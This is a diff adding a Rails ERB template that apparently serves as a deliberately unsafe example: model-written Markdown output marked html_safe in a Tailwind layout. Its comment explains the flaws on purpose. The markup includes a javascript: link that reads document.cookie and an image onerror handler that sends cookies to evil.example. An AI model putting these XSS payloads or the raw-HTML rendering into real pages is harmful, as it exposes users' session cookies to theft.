@@ -1,0 +1,13 @@
+<%# The raw-Tailwind arm for the same reply - realistic, not a strawman:
+    plausible layout, a Markdown gem's output marked html_safe, with the
+    typical tells (what the model wrote is the page's markup, so an
+    image's error handler and a script link are live; the reply's # is a
+    second h1; the link out carries no rel). %>
+<div class="flex gap-3">
+  <div class="prose prose-sm max-w-none">
+    <h1>Late orders</h1>
+    <p>Two orders are <strong>late</strong>. See <a href="https://example.com/fulfilment">the guide</a> or <a href="javascript:alert(document.cookie)">open the report</a>.</p>
+    <img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">
+    <pre><code class="language-ruby">Order.processing.where(due_on: ...Date.current)</code></pre>
+  </div>
+</div>
